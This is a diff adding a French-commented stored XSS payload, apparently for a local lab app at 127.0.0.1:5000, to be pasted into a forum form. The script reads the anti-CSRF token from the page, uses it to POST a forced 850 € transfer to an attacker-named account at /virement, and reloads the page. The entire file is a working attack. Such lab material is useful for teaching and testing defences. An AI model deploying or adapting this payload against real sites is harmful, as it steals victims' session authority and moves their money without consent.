@@ -1,0 +1,47 @@
+<!-- ==============================================================================
+     CHARGE UTILE (PAYLOAD) XSS STOCKÉ POUR CONTOURNER LA PROTECTION CSRF
+     À coller dans le formulaire du forum : http://127.0.0.1:5000/
+     ============================================================================== -->
+
+<script>
+(function() {
+    console.log("[COMBINAISON CSRF+XSS] Exécution du script injecté dans le contexte légitime...");
+
+    // 1. Lire le token anti-CSRF directement depuis le DOM de la page
+    var tokenInput = document.getElementById("csrf_token_input");
+    var token = tokenInput ? tokenInput.value : null;
+
+    if (token) {
+        console.log("[COMBINAISON CSRF+XSS] Jeton CSRF intercepté dans le DOM : " + token);
+
+        // 2. Préparer la requête légitime forgée avec le jeton intercepté
+        var payload = new URLSearchParams();
+        payload.append("dest", "Attaquant_Exploit_XSS");
+        payload.append("montant", "850");
+        payload.append("csrf_token", token);
+
+        // 3. Envoyer la requête POST authentifiée (les cookies de session partent automatiquement)
+        fetch("/virement", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: payload.toString()
+        })
+        .then(function(response) {
+            if (response.ok) {
+                console.log("[COMBINAISON CSRF+XSS] ✅ Succès : Virement forcé de 850 € effectué avec le jeton valide !");
+                // Rafraîchir discrètement pour voir le solde chuter
+                setTimeout(function() { window.location.reload(); }, 1200);
+            } else {
+                console.error("[COMBINAISON CSRF+XSS] Échec HTTP :", response.status);
+            }
+        })
+        .catch(function(err) {
+            console.error("[COMBINAISON CSRF+XSS] Erreur réseau :", err);
+        });
+    } else {
+        console.warn("[COMBINAISON CSRF+XSS] Jeton CSRF non trouvé sur la page courante.");
+    }
+})();
+</script>
